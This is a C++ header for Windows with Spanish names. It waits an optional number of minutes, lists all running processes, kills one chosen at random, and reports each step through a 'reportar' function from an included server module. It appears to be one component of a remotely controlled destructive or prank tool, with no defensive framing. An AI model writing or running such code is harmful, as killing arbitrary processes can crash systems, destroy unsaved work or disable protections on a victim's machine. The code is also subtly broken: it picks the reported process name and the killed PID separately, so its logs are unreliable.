#ifndef ELIMINARPROCESOALEATORIO_HPP
#define ELIMINARPROCESOALEATORIO_HPP

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <string>
#include <thread>
#include <chrono>
#include "server.hpp"

inline void EliminarProcesoAleatorio(int minutos)
{
    std::srand(static_cast<unsigned int>(std::time(nullptr)));
    reportar("Iniciando eliminación de un proceso aleatorio.");

    if (minutos > 0)
    {
        std::string rep = "Esperando " + std::to_string(minutos) + " minutos antes de eliminar el proceso.";
        reportar(rep);
        std::this_thread::sleep_for(std::chrono::minutes(minutos));
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        reportar("No se pudo obtener el snapshot de procesos.");
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32))
    {
        reportar("No se pudo obtener información sobre el primer proceso.");
        CloseHandle(hSnapshot);
        return;
    }

    std::vector<int> procesos;
    std::vector<std::string> nombresProcesos;

    do {
        if (pe32.th32ProcessID != 0)
        {
            procesos.push_back(pe32.th32ProcessID);
            nombresProcesos.push_back(pe32.szExeFile);
        }
    } while (Process32Next(hSnapshot, &pe32));

    if (procesos.empty())
    {
        reportar("No se encontraron procesos para eliminar.");
        CloseHandle(hSnapshot);
        return;
    }

    int procesoAleatorio = procesos[std::rand() % procesos.size()];
    std::string nombreProcesoAleatorio = nombresProcesos[std::rand() % nombresProcesos.size()];
    std::string mensaje = "Seleccionando proceso aleatorio: " + nombreProcesoAleatorio + " con PID: " + std::to_string(procesoAleatorio);
    reportar(mensaje);

    HANDLE hProceso = OpenProcess(PROCESS_TERMINATE, FALSE, procesoAleatorio);
    if (hProceso != NULL)
    {
        if (TerminateProcess(hProceso, 0))
        {
            reportar("Proceso " + nombreProcesoAleatorio + " con PID " + std::to_string(procesoAleatorio) + " terminado correctamente.");
        }
        else
        {
            reportar("No se pudo terminar el proceso " + nombreProcesoAleatorio + " con PID " + std::to_string(procesoAleatorio));
        }

        CloseHandle(hProceso);
    }
    else
    {
        reportar("No se pudo obtener acceso al proceso " + nombreProcesoAleatorio + " con PID " + std::to_string(procesoAleatorio));
    }

    CloseHandle(hSnapshot);
}

#endif
